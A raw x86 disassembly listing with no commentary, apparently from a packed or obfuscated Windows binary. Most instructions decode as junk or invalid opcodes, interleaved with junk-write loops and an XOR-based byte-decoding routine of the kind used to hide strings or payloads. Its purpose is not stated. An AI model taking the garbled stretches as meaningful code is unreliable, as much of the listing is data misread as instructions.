  40939a:	add    DWORD PTR [ebx-0xae6dc4a],edx
  4093a0:	and    BYTE PTR [eax+0x24],bl
  4093a3:	mov    bh,0xeb
  4093a5:	adc    eax,0xb3250421
  4093aa:	inc    edx
  4093ab:	jle    0x409383
  4093ad:	add    al,0x82
  4093af:	jg     0x4093c3
  4093b1:	sbb    DWORD PTR [ebp-0x29],ecx
  4093b4:	fmul   QWORD PTR [ecx]
  4093b6:	xor    DWORD PTR [eax-0x46725cbb],ebp
  4093bc:	mov    ds:0x7098aab4,eax
  4093c1:	mul    BYTE PTR [ebp+edx*8+0x74bc3202]
  4093c8:	call   0xa2eb937d
  4093cd:	xor    DWORD PTR [esp+edx*2],edi
  4093d0:	and    edx,esp
  4093d2:	mov    eax,0xe440d1e7
  4093d7:	sub    BYTE PTR [eax+0x429d8bff],cl
  4093dd:	jnp    0x4093cb
  4093df:	lods   al,BYTE PTR ds:[esi]
  4093e0:	fstp   QWORD PTR [ecx+0x5f597ece]
  4093e6:	shr    BYTE PTR [edi-0x13],cl
  4093e9:	inc    ebp
  4093ea:	call   0xee46:0x43b2ed00
  4093f1:	cld    
  4093f2:	lods   al,BYTE PTR ds:[esi]
  4093f3:	sub    eax,0x89f3eb48
  4093f8:	dec    esi
  4093f9:	retf   0x5e61
  4093fc:	cdq    
  4093fd:	call   0xe27d:0xacff15f9
  409404:	and    DWORD PTR [esi],0x4cc4b2f5
  40940a:	xlat   BYTE PTR ds:[ebx]
  40940b:	iret   
  40940c:	sub    al,0xb3
  40940e:	ins    BYTE PTR es:[edi],dx
  40940f:	mov    eax,0x399b05c8
  409414:	mov    ds:0x6639e75c,eax
  409419:	cmc    
  40941a:	inc    ecx
  40941b:	cmp    BYTE PTR [edx-0x57],bh
  40941e:	xor    al,0x39
  409420:	or     BYTE PTR [ebx+ecx*4-0x43],ah
  409424:	cmp    ebp,esi
  409426:	lds    esp,FWORD PTR [ecx-0x42375c6b]
  40942c:	inc    esi
  40942d:	hlt    
  40942e:	inc    esp
  40942f:	lods   al,BYTE PTR ds:[esi]
  409430:	aas    
  409431:	mov    edx,0x57e59c62
  409436:	lahf   
  409437:	jns    0x409412
  409439:	shl    DWORD PTR [ebp-0x28bddeaf],0x72
  409440:	(bad)  
  409441:	push   ecx
  409442:	push   eax
  409443:	out    dx,al
  409444:	cli    
  409445:	cld    
  409446:	mov    ebp,0xf7e264dd
  40944b:	das    
  40944c:	sbb    DWORD PTR [ecx+0x4dc5c78e],0xfffffff4
  409453:	ds add al,0x2f
  409456:	mov    al,ds:0x51004d2f
  40945b:	cmp    edi,esi
  40945d:	ins    DWORD PTR es:[edi],dx
  40945e:	and    DWORD PTR [edi],0x725b0ed8
  409464:	in     eax,dx
  409465:	fisttp QWORD PTR ds:0x58966c3c
  40946b:	repz arpl WORD PTR [ebp-0x58411c5],bp
  409472:	push   esi
  409473:	push   edi
  409474:	fs retf 
  409476:	mov    ebx,gs
  409478:	push   eax
  409479:	in     al,dx
  40947a:	call   0x97aa417d
  40947f:	fst    QWORD PTR [edi-0x74]
  409482:	lods   eax,DWORD PTR ds:[esi]
  409483:	shl    BYTE PTR [ecx+0x7],1
  409486:	pusha  
  409487:	leave  
  409488:	retf   
  409489:	shl    BYTE PTR [eax],1
  40948b:	stc    
  40948c:	xor    al,0xd2
  40948e:	mov    ch,0xa3
  409490:	sub    DWORD PTR [eax+0x458a6076],ebp
  409496:	inc    DWORD PTR [ecx+0x42473e35]
  40949c:	add    cl,al
  40949e:	or     DWORD PTR [eax],eax
  4094a0:	add    BYTE PTR [ebx+0x2581f04d],cl
  4094a6:	in     al,0xa6
  4094a8:	inc    esp
  4094a9:	add    dl,al
  4094ab:	jnp    0x4094ad
  4094ad:	add    BYTE PTR [ecx+ecx*2],dh
  4094b0:	sub    al,0x35
  4094b2:	mov    DWORD PTR ds:0x41074f,0x4e04
  4094bc:	mov    BYTE PTR [ecx],al
  4094be:	sbb    DWORD PTR ds:0x447990,0x3d76
  4094c8:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  4094cf:	mov    DWORD PTR [ebp-0x10],0xf89c8534
  4094d6:	or     ecx,0x8aa
  4094dc:	mov    eax,DWORD PTR [ebp-0x8]
  4094df:	and    DWORD PTR ds:0x44d410,0x0
  4094e9:	mov    ecx,DWORD PTR ds:0x44d410
  4094ef:	inc    ecx
  4094f0:	mov    DWORD PTR ds:0x44d410,ecx
  4094f6:	cmp    DWORD PTR ds:0x44d410,0x1e
  4094fd:	jne    0x40951b
  409503:	push   DWORD PTR [ebp-0x10]
  409506:	push   0x410939
  40950b:	push   0x41098d
  409510:	push   0x410939
  409515:	call   DWORD PTR ds:0x442040
  40951b:	cmp    DWORD PTR ds:0x44d410,0x11
  409522:	jb     0x4094e9
  409528:	xor    DWORD PTR ds:0x42472a,ebx
  40952e:	mov    ecx,0x7510857
  409533:	push   esi
  409534:	and    DWORD PTR ds:0x44a6d4,0x0
  40953e:	jmp    0x409550
  409543:	mov    esi,DWORD PTR ds:0x44a6d4
  409549:	inc    esi
  40954a:	mov    DWORD PTR ds:0x44a6d4,esi
  409550:	cmp    DWORD PTR ds:0x44a6d4,0x17
  409557:	jae    0x409585
  40955d:	cmp    DWORD PTR ds:0x44a6d4,0x1e
  409564:	jne    0x409580
  40956a:	push   0x4107a9
  40956f:	push   DWORD PTR [ebp-0x20]
  409572:	push   DWORD PTR [ebp-0x20]
  409575:	push   0x7787
  40957a:	call   DWORD PTR ds:0x4423a8
  409580:	jmp    0x409543
  409585:	xor    eax,ecx
  409587:	mov    esi,0x32729e
  40958c:	add    eax,esi
  40958e:	jmp    0x4095af
  409593:	mov    DWORD PTR ds:0x44a6e0,0x1147
  40959d:	mov    dl,BYTE PTR [ebp-0x1]
  4095a0:	mov    DWORD PTR ds:0x4479a4,0x2700
  4095aa:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  4095ae:	inc    eax
  4095af:	mov    DWORD PTR ds:0x44a6dc,0x2e0e
  4095b9:	cmp    eax,0x40
  4095bc:	jb     0x409593
  4095c2:	mov    edx,DWORD PTR [ebp-0x8]
  4095c5:	xor    DWORD PTR ds:0x41073f,0x7536
  4095cf:	mov    eax,DWORD PTR [ebp-0xc]
  4095d2:	add    DWORD PTR ds:0x4479a0,0x44d41c
  4095dc:	jmp    0x409732
  4095e1:	cmp    eax,ebx
  4095e3:	bound  edx,QWORD PTR [edx+0x65]
  4095e6:	push   0x39
  4095e8:	pop    ebx
  4095e9:	jmp    0x4095e6
  4095eb:	adc    al,0xc5
  4095ed:	cmp    al,0x7e
  4095ef:	mov    WORD PTR [esi-0x4a],?
  4095f2:	int    0x7c
  4095f4:	jl     0x40961d
  4095f6:	jg     0x409674
  4095f8:	jl     0x409596
  4095fa:	leave  
  4095fb:	shr    BYTE PTR [eax],0xac
  4095fe:	mov    ebx,0xa74d2c16
  409603:	xchg   edi,eax
  409604:	enter  0x3baf,0x35
  409608:	jb     0x409633
  40960a:	leave  
  40960b:	std    
  40960c:	rol    DWORD PTR [eax-0x77],0x88
  409610:	fwait
  409611:	xchg   ecx,eax
  409612:	sbb    dh,0x81
  409615:	or     esi,DWORD PTR [ebp+0x48]
  409618:	shr    DWORD PTR [ecx-0x33a4c1b5],cl
  40961e:	lds    eax,FWORD PTR [esi]
  409620:	and    BYTE PTR [ebx-0x79],bl
  409623:	jnp    0x40960c
  409625:	xor    eax,0x50931eb5
  40962a:	pushf  
  40962b:	add    edx,DWORD PTR [edx+ecx*2]
  40962e:	outs   dx,BYTE PTR ds:[esi]
  40962f:	mov    DWORD PTR [ebx+0xdebd33a],esi
  409635:	dec    eax
  409636:	imul   esp,DWORD PTR [ecx+0x3e],0x532d15bc
  40963d:	inc    ecx
  40963e:	leave  
  40963f:	cdq    
  409640:	mov    al,ds:0xa8b7682
  409645:	test   eax,0xf01af20b
  40964a:	test   DWORD PTR [eax],esp
  40964c:	ret    
  40964d:	leave  
  40964e:	fwait
  40964f:	imul   ebp,DWORD PTR [eax],0x7cdc0631
  409655:	jmp    0x3bd84039
  40965a:	popf   
  40965b:	stos   DWORD PTR es:[edi],eax
  40965c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40965d:	popa   
  40965e:	push   esi
  40965f:	xchg   ebx,eax
  409660:	loope  0x4096b6
  409662:	jbe    0x409639
  409664:	adc    ah,BYTE PTR [eax+0x6c]
  409667:	or     BYTE PTR [esi+0x6424452d],0x8a
  40966e:	hlt    
  40966f:	aas    
  409670:	scas   al,BYTE PTR es:[edi]
  409671:	cmp    eax,0xb9a62808
  409676:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409678:	jae    0x40965f
  40967a:	sub    ebp,eax
  40967c:	ins    BYTE PTR es:[edi],dx
  40967d:	mov    eax,ds:0x9eae31bc
  409682:	pop    eax
  409683:	sbb    al,0x7a
  409685:	rol    DWORD PTR [ebp-0x6058df4d],cl
  40968b:	jmp    0x527fbc05
  409690:	je     0x4096a5
  409692:	jmp    0xf5c0:0x2a8870f5
  409699:	leave  
  40969a:	cdq    
  40969b:	pop    ebx
  40969c:	and    edi,DWORD PTR [edx-0x19d69d70]
  4096a2:	cld    
  4096a3:	mov    ecx,0x8e9bc723
  4096a8:	adc    edi,ebp
  4096aa:	lea    edx,[eax-0x29]
  4096ad:	mov    cl,0xc3
  4096af:	pushf  
  4096b0:	call   0xf3fd:0x53f8148f
  4096b7:	mov    ah,0x6c
  4096b9:	lea    edi,[ebx-0x18]
  4096bc:	sbb    DWORD PTR [edi-0x2d723c0],edx
  4096c2:	push   esi
  4096c3:	scas   al,BYTE PTR es:[edi]
  4096c4:	mov    dh,0x23
  4096c6:	inc    eax
  4096c7:	arpl   WORD PTR [eax+0x5e],bp
  4096ca:	adc    BYTE PTR [ebp+0x66721f6a],bl
  4096d0:	bound  ebp,QWORD PTR [esi]
  4096d2:	call   eax
  4096d4:	lds    esp,FWORD PTR [edi+0x7ddbad96]
  4096da:	adc    ah,dl
  4096dc:	inc    ecx
  4096dd:	call   0xac49:0xbb59ccc1
  4096e4:	add    al,0x84
  4096e6:	push   edi
  4096e7:	ss js  0x409753
  4096ea:	dec    edi
  4096eb:	(bad)  [ebp+ecx*1+0x438695df]
  4096f2:	in     eax,dx
  4096f3:	jge    0x409747
  4096f5:	jmp    0x95f07d2a
  4096fa:	mov    ah,0x46
  4096fc:	mov    dl,0x91
  4096fe:	push   ds
  4096ff:	shr    DWORD PTR [eax],1
  409701:	dec    edi
  409702:	(bad)  
  409703:	or     edx,DWORD PTR [ebx+ebp*4-0x5f]
  409707:	loop   0x4096b2
  409709:	xchg   ebp,eax
  40970a:	test   eax,0x6efa12bc
  40970f:	dec    edx
  409710:	fst    QWORD PTR [edx-0x70a74f89]
  409716:	cmp    eax,0xa5e91306
  40971b:	mov    ebp,0xfece5d44
  409720:	arpl   WORD PTR [esi],bx
  409722:	jno    0x4096a9
  409724:	jne    0x409781
  409726:	sub    BYTE PTR [edx+0x2dde48f8],0xbb
  40972d:	jmp    0xd133:0x3fa02fe1
  409734:	add    edx,esi
  409736:	mov    DWORD PTR ds:0x44799c,0x4464
  409740:	cmp    edx,eax
  409742:	mov    DWORD PTR ds:0x42473a,0xc14
  40974c:	je     0x40993f
  409752:	add    DWORD PTR ds:0x447998,0x1465
  40975c:	push   ebx
  40975d:	and    DWORD PTR ds:0x44a6d8,0x0
  409767:	mov    eax,ds:0x44a6d8
  40976c:	inc    eax
  40976d:	mov    ds:0x44a6d8,eax
  409772:	cmp    DWORD PTR ds:0x44a6d8,0x10
  409779:	jne    0x409785
  40977f:	call   DWORD PTR ds:0x4423ac
  409785:	cmp    DWORD PTR ds:0x44a6d8,0xf
  40978c:	jne    0x40979d
  409792:	mov    eax,ds:0x44a6d8
  409797:	inc    eax
  409798:	mov    ds:0x44a6d8,eax
  40979d:	cmp    DWORD PTR ds:0x44a6d8,0x1d
  4097a4:	jb     0x409767
  4097aa:	push   edi
  4097ab:	jmp    0x409901
  4097b0:	push   esp
  4097b1:	ss push edx
  4097b3:	std    
  4097b4:	push   edx
  4097b5:	jge    0x40981e
  4097b7:	pop    ebp
  4097b8:	add    al,0xa1
  4097ba:	or     eax,0xc9d8b30d
  4097bf:	mov    esi,DWORD PTR [ecx-0x31]
  4097c2:	jl     0x409840
  4097c4:	daa    
  4097c5:	jg     0x409843
  4097c7:	jl     0x4097d9
  4097c9:	fwait
  4097ca:	push   ebp
  4097cb:	jl     0x40981d
  4097cd:	ja     0x409774
  4097cf:	shl    BYTE PTR [eax+ecx*2],1
  4097d2:	inc    eax
  4097d3:	sar    BYTE PTR [ebx+esi*4-0xd],1
  4097d7:	xchg   ebp,eax
  4097d8:	sti    
  4097d9:	shr    DWORD PTR [esp+eiz*4-0x68],0xc1
  4097de:	bound  eax,QWORD PTR [edx*2+0xa6cf4b5]
  4097e5:	loopne 0x409860
  4097e7:	stos   BYTE PTR es:[edi],al
  4097e8:	and    edi,esi
  4097ea:	sbb    BYTE PTR [ebx+eiz*2],ch
  4097ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097ee:	xchg   ebp,eax
  4097ef:	cwde   
  4097f0:	or     BYTE PTR [edi-0x78c26b19],dl
  4097f6:	lock out 0x2d,al
  4097f9:	inc    eax
  4097fa:	push   edx
  4097fb:	adc    ch,dl
  4097fd:	call   0x1ba5:0x72320e26
  409804:	mov    dl,0xf3
  409806:	mov    ?,ebx
  409808:	or     cl,dl
  40980a:	sahf   
  40980b:	push   edi
  40980c:	dec    esp
  40980d:	shl    ah,cl
  40980f:	or     BYTE PTR [edi+eiz*2+0xc],cl
  409813:	loop   0x409837
  409815:	ins    DWORD PTR es:[edi],dx
  409816:	mov    esi,0xbd3ca9a9
  40981b:	shr    BYTE PTR [eax],0x5
  40981e:	or     al,0x9a
  409820:	pop    edx
  409821:	xlat   BYTE PTR ds:[ebx]
  409822:	xchg   eax,esp
  409824:	inc    ebp
  409825:	aam    0x69
  409827:	add    al,0x23
  409829:	xchg   esp,eax
  40982a:	out    0xdf,al
  40982c:	scas   eax,DWORD PTR es:[edi]
  40982d:	pop    ebp
  40982e:	(bad)  
  409830:	inc    edx
  409831:	out    0xb,eax
  409833:	scas   eax,DWORD PTR es:[edi]
  409834:	test   eax,0x6abafd97
  40983a:	xor    edi,DWORD PTR [ecx+0x51]
  40983d:	or     BYTE PTR [edi+0x3fa73c90],dl
  409843:	xchg   edx,esp
  409845:	mov    edx,0xa51e3136
  40984a:	xchg   BYTE PTR [ebp+0x2d6b5859],cl
  409850:	es xchg edx,eax
  409852:	and    DWORD PTR [ecx+0xb],esp
  409855:	pop    ds
  409856:	jge    0x40984e
  409858:	mov    ds:0x338c199,al
  40985d:	push   0x400f0dca
  409862:	(bad)  
  409863:	(bad)  
  409864:	mov    esi,0xbb329ccd
  409869:	xor    eax,0x94e4ffea
  40986e:	mov    edi,0x4133db74
  409873:	pop    ds
  409874:	jb     0x409854
  409876:	data16 fimul DWORD PTR [edx+0x19668027]
  40987d:	cmp    DWORD PTR [ebx+edi*4],edi
  409880:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409881:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409882:	or     esp,ebp
  409884:	mov    ch,0x22
  409886:	popf   
  409887:	xchg   edx,eax
  409888:	aas    
  409889:	or     BYTE PTR [ebp-0x5b1c060b],dl
  40988f:	outs   dx,BYTE PTR ds:[esi]
  409890:	sub    DWORD PTR [esi+eax*2-0x29],esi
  409894:	xchg   ecx,eax
  409895:	repnz and BYTE PTR [ecx-0x5],cl
  409899:	mov    ch,0xaa
  40989b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40989c:	jo     0x409842
  40989e:	jmp    0xdc52ca7
  4098a3:	ret    
  4098a4:	aaa    
  4098a5:	ror    BYTE PTR [esi-0x1054a7aa],cl
  4098ab:	cdq    
  4098ac:	sahf   
  4098ad:	dec    ecx
  4098ae:	ror    BYTE PTR [edi],0x36
  4098b1:	sub    eax,ebp
  4098b3:	or     eax,0x6b70b0a0
  4098b8:	pop    eax
  4098b9:	pop    edx
  4098ba:	test   DWORD PTR [ecx-0x198cfe62],ecx
  4098c0:	imul   eax,edi,0x28
  4098c3:	or     BYTE PTR [ebp+0x30a91e47],0x9e
  4098ca:	popf   
  4098cb:	adc    eax,0x309f4f34
  4098d0:	in     al,dx
  4098d1:	sub    DWORD PTR [esi+esi*4-0x75],0xea1cf5c6
  4098d9:	sub    eax,DWORD PTR [edi]
  4098db:	jle    0x40985d
  4098dd:	(bad)  
  4098de:	cmp    bl,BYTE PTR [edx]
  4098e0:	inc    DWORD PTR [edi-0x1]
  4098e3:	call   FWORD PTR [ebx+0x33]
  4098e6:	sbb    BYTE PTR [ebp-0x6d],0x1d
  4098ea:	sub    eax,0x4326df2b
  4098ef:	sub    BYTE PTR [eax+0xd],bl
  4098f2:	adc    eax,0x7325ba99
  4098f7:	les    esp,FWORD PTR [esp+esi*2+0x6e]
  4098fb:	fcomp  DWORD PTR [edx]
  4098fd:	pop    sp
  4098ff:	mov    dh,0x46
  409901:	mov    edi,DWORD PTR [ebp+0x8]
  409904:	mov    eax,0x8a42
  409909:	xor    ax,WORD PTR [edi+edx*4+0x2]
  40990e:	mov    edi,0x3b08
  409913:	add    ax,di
  409916:	movzx  eax,ax
  409919:	mov    DWORD PTR [ebp-0x14],eax
  40991c:	mov    eax,DWORD PTR [ebp+0x8]
  40991f:	movzx  eax,WORD PTR [eax+edx*4]
  409923:	xor    eax,0x8a42
  409928:	add    eax,edi
  40992a:	mov    edi,DWORD PTR [ebp-0x14]
  40992d:	mov    BYTE PTR [ebp+edi*1-0x58],al
  409931:	mov    eax,DWORD PTR [ebp-0xc]
  409934:	inc    edx
  409935:	cmp    edx,eax
  409937:	jne    0x409901
  40993d:	pop    edi
  40993e:	pop    ebx
  40993f:	mov    eax,DWORD PTR [ebp-0x8]
  409942:	mov    edx,DWORD PTR [ebp+0x10]
  409945:	xor    eax,ecx
  409947:	add    eax,esi
  409949:	mov    DWORD PTR [edx],eax
  40994b:	mov    eax,DWORD PTR [ebp-0x8]
  40994e:	xor    eax,ecx
  409950:	add    eax,esi
  409952:	mov    DWORD PTR [ebp+0x8],eax
  409955:	mov    eax,DWORD PTR [ebp+0x8]
  409958:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  40995c:	mov    dl,BYTE PTR [ebp-0x1]
  40995f:	cmp    al,dl
  409961:	je     0x409afa
  409967:	mov    eax,DWORD PTR [ebp+0x8]
  40996a:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  40996e:	mov    edx,DWORD PTR [ebp+0xc]
  409971:	cmp    al,BYTE PTR [edx]
  409973:	jne    0x409b20
  409979:	mov    eax,DWORD PTR [ebp-0x8]
  40997c:	mov    edx,DWORD PTR [ebp+0xc]
  40997f:	movsx  edx,BYTE PTR [edx]
  409982:	xor    eax,ecx
  409984:	add    eax,esi
  409986:	cmp    edx,eax
  409988:	je     0x409b14
  40998e:	jmp    0x409ae4
  409993:	add    ah,ah
  409995:	clc    
  409996:	pop    es
  409997:	clc    
  409998:	sbb    esp,ebx
  40999a:	sti    
  40999b:	ins    DWORD PTR es:[edi],dx
  40999c:	sbb    BYTE PTR [esp+ebp*8],ch
  40999f:	imul   ecx,ecx,0xce381d7f
  4099a5:	jl     0x409a23
  4099a7:	daa    
  4099a8:	jg     0x409a26
  4099aa:	jl     0x409936
  4099ac:	sbb    BYTE PTR [ecx+0x3a],al
  4099af:	and    eax,0xa9527f87
  4099b4:	aas    
  4099b5:	(bad)  
  4099b6:	icebp  
  4099b7:	pop    edi
  4099b8:	sub    edx,esi
  4099ba:	dec    esi
  4099bb:	(bad)  
  4099bd:	sub    esp,edi
  4099bf:	adc    al,0x5f
  4099c1:	sbb    eax,0xb013dd32
  4099c6:	jno    0x409968
  4099c8:	mov    eax,0x9cdab166
  4099cd:	pop    es
  4099ce:	aaa    
  4099cf:	xlat   BYTE PTR ds:[ebx]
  4099d0:	loop   0x4099ad
  4099d2:	fcom   QWORD PTR [ebp-0x33]
  4099d5:	mov    edx,0xcdf2e166
  4099da:	and    edx,eax
  4099dc:	addr16 pop esi
  4099de:	pop    ecx
  4099df:	lahf   
  4099e0:	bnd jl 0x4099a2
  4099e3:	mov    fs,eax
  4099e5:	mov    bl,0x39
  4099e7:	cld    
  4099e8:	pop    ecx
  4099e9:	xchg   WORD PTR [edi-0x27051fb7],si
  4099f0:	mov    ebp,0x4507084a
  4099f5:	div    dl
  4099f7:	lock add al,0x84
  4099fa:	lock pop eax
  4099fc:	add    bl,BYTE PTR [ebx+edi*4]
  4099ff:	jge    0x409a19
  409a01:	enter  0xd030,0x4b
  409a05:	mov    edx,0x4c30bc09
  409a0a:	push   es
  409a0b:	add    eax,0xc596f925
  409a10:	aaa    
  409a11:	data16 not BYTE PTR [edi-0x4e]
  409a15:	lods   eax,DWORD PTR ds:[esi]
  409a16:	iret   
  409a17:	out    0xc,al
  409a19:	pushf  
  409a1a:	mov    ch,0x32
  409a1c:	inc    ebp
  409a1d:	loope  0x409a73
  409a1f:	or     bl,al
  409a21:	sbb    ebx,DWORD PTR [edx+0x70]
  409a24:	std    
  409a25:	jmp    FWORD PTR [ebx+0x5d]
  409a28:	sub    eax,0x52ae06b9
  409a2d:	sub    BYTE PTR [eax-0x30c4e415],ah
  409a33:	rol    DWORD PTR [ebp-0x498c9f2e],1
  409a39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a3a:	in     eax,0xee
  409a3c:	adc    ebx,DWORD PTR [ebp-0x1e]
  409a3f:	pushf  
  409a40:	adc    DWORD PTR [ecx+0x14da6b0c],eax
  409a46:	xchg   edx,eax
  409a47:	pop    edx
  409a48:	loopne 0x409a33
  409a4a:	(bad)  
  409a4b:	push   ebp
  409a4c:	leave  
  409a4d:	std    
  409a4e:	scas   al,BYTE PTR es:[edi]
  409a4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a50:	pop    edx
  409a51:	test   DWORD PTR [edi],0xee53faeb
  409a57:	ds icebp 
  409a59:	jbe    0x409a55
  409a5b:	fcmovb st,st(4)
  409a5d:	or     ch,bl
  409a5f:	fiadd  WORD PTR [edx+0x11]
  409a62:	sub    al,0x4c
  409a64:	push   es
  409a65:	test   al,0xaa
  409a67:	scas   al,BYTE PTR es:[edi]
  409a68:	mov    dl,0xc5
  409a6a:	xchg   ecx,eax
  409a6b:	pop    ds
  409a6c:	mov    cl,cl
  409a6e:	rcr    DWORD PTR [ebp-0x38195f0c],0x6f
  409a75:	(bad)  
  409a76:	out    dx,al
  409a77:	xor    al,0x88
  409a79:	sti    
  409a7a:	repz cli 
  409a7c:	test   DWORD PTR [edx+0x2c],ebx
  409a7f:	jns    0x409aef
  409a81:	imul   ecx,DWORD PTR [ebp+0x61],0xf742479d
  409a88:	add    al,0x1d
  409a8a:	mov    ds:0xc524f4df,eax
  409a8f:	adc    DWORD PTR ds:0x94ac4b72,eax
  409a95:	mov    ah,0xef
  409a97:	mov    DWORD PTR [edi+eax*1],edi
  409a9a:	in     eax,dx
  409a9b:	jne    0x409ac8
  409a9d:	mov    ebx,0x2a64f64c
  409aa2:	pop    eax
  409aa3:	push   ss
  409aa4:	mov    DWORD PTR [edi-0x11a91310],ebp
  409aaa:	int    0xfa
  409aac:	add    eax,0xfd7fc14e
  409ab1:	mov    edi,0x62cd86c2
  409ab6:	pop    ss
  409ab7:	rcl    DWORD PTR [esi],0x68
  409aba:	dec    ebp
  409abb:	mov    bl,0xb7
  409abd:	test   al,0xe3
  409abf:	out    dx,al
  409ac0:	push   edx
  409ac1:	inc    eax
  409ac2:	push   0x4f
  409ac4:	(bad)  
  409ac5:	aaa    
  409ac6:	stos   DWORD PTR es:[edi],eax
  409ac7:	and    eax,0xfe31530f
  409acc:	mov    ebx,esp
  409ace:	aad    0xae
  409ad0:	cmc    
  409ad1:	xor    cl,bh
  409ad3:	cmp    ch,0x6b
  409ad6:	outs   dx,BYTE PTR ds:[esi]
  409ad7:	ror    DWORD PTR [edi],0x9f
  409ada:	cmp    al,0x4b
  409adc:	lock push ds
  409ade:	in     al,0x55
  409ae0:	ret    
  409ae1:	rcr    BYTE PTR [esi+ebx*1-0x39],0x45
  409ae6:	call   0x746987a
  409aeb:	lea    eax,[ebp-0x18]
  409aee:	mov    DWORD PTR [ebp-0x14],eax
  409af1:	mov    eax,DWORD PTR [ebp-0x14]
  409af4:	add    DWORD PTR [eax],0x705fa8f
  409afa:	mov    eax,DWORD PTR [ebp-0x10]
  409afd:	mov    edx,DWORD PTR [ebp+0x8]
  409b00:	xor    eax,ecx
  409b02:	lea    eax,[eax+edx*1+0x32729e]
  409b09:	mov    DWORD PTR [ebp+0x8],eax
  409b0c:	inc    DWORD PTR [ebp+0xc]
  409b0f:	jmp    0x409955
  409b14:	mov    eax,DWORD PTR [ebp-0x10]
  409b17:	xor    eax,ecx
  409b19:	mov    ecx,DWORD PTR [ebp+0x10]
  409b1c:	add    eax,esi
  409b1e:	mov    DWORD PTR [ecx],eax
  409b20:	pop    esi
  409b21:	leave  
  409b22:	ret    0xc
  409b25:	push   ebp
  409b26:	mov    ebp,esp
  409b28:	push   ecx
  409b29:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  409b30:	sub    DWORD PTR ds:0x41074b,edx
  409b36:	mov    eax,DWORD PTR [ebp+0x8]
  409b39:	jmp    0x409ca4
  409b3e:	push   cs
  409b3f:	xchg   BYTE PTR [esi],dl
  409b41:	fs xchg esi,eax
  409b43:	fs dec esi
  409b45:	data16 jg 0x409bb3
  409b48:	pop    esp
  409b49:	lds    edi,FWORD PTR [ecx+ebp*8-0x3e1ca999]
  409b50:	jl     0x409bce
  409b52:	retf   0x7c7f
  409b55:	jl     0x409b1e
  409b57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b58:	je     0x409afd
  409b5a:	jmp    0x80b3c3c0
  409b5f:	gs sub al,0x84
  409b62:	and    al,BYTE PTR [ecx-0x5d2d1d5c]
  409b68:	lock jp 0x409b8a
  409b6b:	jle    0x409bbc
  409b6d:	add    BYTE PTR [eax],cl
  409b6f:	adc    BYTE PTR [ebp-0x53],0xbb
  409b73:	sub    ah,al
  409b75:	xchg   ecx,eax
  409b76:	int    0xe7
  409b78:	enter  0x37d0,0xf4
  409b7c:	dec    esi
  409b7d:	call   0xae664af9
  409b82:	cli    
  409b83:	sbb    dl,BYTE PTR [edx+0x55]
  409b86:	pop    edi
  409b87:	and    ecx,DWORD PTR [ecx-0x4f60b4]
  409b8d:	mov    WORD PTR [ebp+eax*1-0x4e],fs
  409b91:	out    dx,al
  409b92:	shr    edx,0x2c
  409b95:	adc    eax,0x7f05fc2a
  409b9a:	push   edi
  409b9b:	arpl   di,bp
  409b9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b9e:	pop    edi
  409b9f:	imul   edx,DWORD PTR [ecx+0x31],0xd8620bce
  409ba6:	call   0x922933a2
  409bab:	adc    BYTE PTR gs:[esi],dl
  409bae:	call   0x60d2f0e3
  409bb3:	cmp    edx,DWORD PTR [ebp+0x2b]
  409bb6:	mov    ebx,0xd862dac9
  409bbb:	test   eax,0xcf6c938f
  409bc0:	push   ss
  409bc1:	dec    ebp
  409bc2:	sbb    ah,ch
  409bc4:	das    
  409bc5:	lahf   
  409bc6:	xchg   BYTE PTR [ebx+0x75795509],ah
  409bcc:	aam    0x7c
  409bce:	jbe    0x409bd6
  409bd0:	inc    eax
  409bd1:	fisubr DWORD PTR [ecx]
  409bd3:	or     ebp,0x43
  409bd6:	xchg   esp,eax
  409bd7:	jns    0x409b6b
  409bd9:	aad    0xb2
  409bdb:	xchg   edi,eax
  409bdc:	out    0xb1,al
  409bde:	pop    ebx
  409bdf:	jp     0x409c55
  409be1:	pop    edi
  409be2:	pop    ds
  409be3:	or     al,0xf
  409be5:	xor    ch,bh
  409be7:	icebp  
  409be8:	jl     0x409c28
  409bea:	adc    eax,0x471fb173
  409bef:	adc    DWORD PTR [edx+0x16],edx
  409bf2:	add    eax,0x1ec28e55
  409bf7:	(bad)  [eax-0x171535b7]
  409bfd:	pop    ebp
  409bfe:	leave  
  409bff:	push   ebx
  409c00:	out    dx,eax
  409c01:	in     al,dx
  409c02:	inc    esi
  409c03:	cs add eax,0xa8ae1132
  409c09:	dec    eax
  409c0a:	cli    
  409c0b:	sub    ebp,0xffffff9d
  409c0e:	add    eax,0xaae42ddf
  409c13:	(bad)  
  409c15:	mov    ebp,0xe7a0df3
  409c1a:	mov    ebp,DWORD PTR [ebx]
  409c1c:	pop    esi
  409c1d:	mov    edx,0x8612af9
  409c22:	out    dx,al
  409c23:	in     eax,0x2d
  409c25:	xchg   edi,eax
  409c26:	sbb    BYTE PTR [eax+0x2fd4b6ae],cl
  409c2c:	fst    DWORD PTR [esi-0x6bcb1ff8]
  409c32:	or     al,0xd1
  409c34:	fisub  WORD PTR [esi-0x4]
  409c37:	push   ss
  409c38:	int3   
  409c39:	mov    esi,0x18835614
  409c3e:	pop    esi
  409c3f:	(bad)  
  409c40:	arpl   WORD PTR [ebp+0x27b03e5],ax
  409c46:	push   ebx
  409c47:	add    al,0x88
  409c49:	pop    ebx
  409c4b:	pusha  
  409c4c:	pusha  
  409c4d:	mov    eax,0x6e8e9f87
  409c52:	stc    
  409c53:	retf   0xb71a
  409c56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c57:	xlat   BYTE PTR ds:[ebx]
  409c58:	jae    0x409c48
  409c5a:	loope  0x409cae
  409c5c:	fld    QWORD PTR [edi]
  409c5e:	dec    edx
  409c5f:	sub    al,0xc9
  409c61:	push   es
